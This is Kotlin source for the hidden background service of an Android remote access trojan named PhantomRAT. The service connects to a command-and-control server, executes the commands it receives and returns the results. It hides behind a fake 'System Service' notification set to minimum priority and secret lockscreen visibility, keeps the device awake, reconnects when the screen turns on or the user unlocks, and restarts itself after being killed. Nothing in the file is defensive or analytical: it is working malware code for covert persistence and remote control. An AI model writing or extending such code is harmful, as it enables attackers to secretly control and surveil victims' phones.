package com.phantom.rat.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.phantom.rat.R
import com.phantom.rat.core.C2Client
import com.phantom.rat.core.CommandHandler
import kotlinx.coroutines.*

class HiddenService : Service() {

    private lateinit var c2Client: C2Client
    private lateinit var commandHandler: CommandHandler
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private var restartCount = 0

    companion object {
        private const val CHANNEL_ID = "phantom_hidden_channel"
        private const val NOTIFICATION_ID = 9999
        var isRunning = false
            private set
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        
        c2Client = C2Client(this)
        commandHandler = CommandHandler(this)
        
        c2Client.setCommandCallback { command ->
            serviceScope.launch {
                val result = commandHandler.handleCommand(command)
                c2Client.sendCommandResult(
                    command.optString("id", ""), 
                    result
                )
            }
        }
        
        acquireWakeLock()
        registerScreenReceiver()
        startForegroundService()
        c2Client.connect()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "PhantomRAT:WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
        } catch (_: Exception) {}
    }

    private fun registerScreenReceiver() {
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        registerReceiver(screenReceiver, filter)
    }

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_ON -> {
                    c2Client.connect()
                }
                Intent.ACTION_SCREEN_OFF -> {
                    // Keep alive
                }
                Intent.ACTION_USER_PRESENT -> {
                    c2Client.connect()
                }
            }
        }
    }

    private fun startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running system optimizations...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY_COMPATIBILITY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        serviceScope.cancel()
        c2Client.disconnect()
        
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
        
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        
        // Auto-restart with exponential backoff
        restartCount++
        val delay = minOf(1000L * restartCount, 30000L)
        
        Handler(mainLooper).postDelayed({
            val restartIntent = Intent(this, HiddenService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }, delay)
        
        super.onDestroy()
    }
}
